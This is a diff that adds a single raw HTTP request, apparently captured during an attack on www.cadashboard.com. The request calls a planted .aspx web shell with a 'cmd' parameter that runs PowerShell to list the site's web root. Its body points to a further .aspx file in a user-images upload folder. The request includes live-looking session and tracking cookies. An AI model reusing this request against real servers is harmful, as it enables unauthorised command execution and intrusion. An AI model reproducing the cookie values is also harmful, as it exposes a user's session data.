@@ -1,0 +1,16 @@
+GET /web/968185.aspx?cmd=powershell+ls+c:\inetpub\wwwroot\CAD\cadashboard%20 HTTP/2
+Host: www.cadashboard.com
+Cookie: __AntiXsrfToken=d243daeb71ba48d284e042dadb1fbe8f; _fbp=fb.1.1752212413213.14207336186323738; _ga=GA1.1.975998406.1752212414; _gid=GA1.2.790560441.1752212414; _ga_8V7TYS9K1L=GS2.1.s1752216676$o2$g1$t1752216682$j54$l0$h0; chatid=149273e4-dba6-4fe2-8346-40f7dd459c29
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.cadashboard.com/Manage_Profile
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Priority: u=4, i
+Te: trailers
+Content-Length: 70
+
+c:\inetpub\wwwroot\CAD\cadashboard Redesign\API\UserImages\968149.aspx
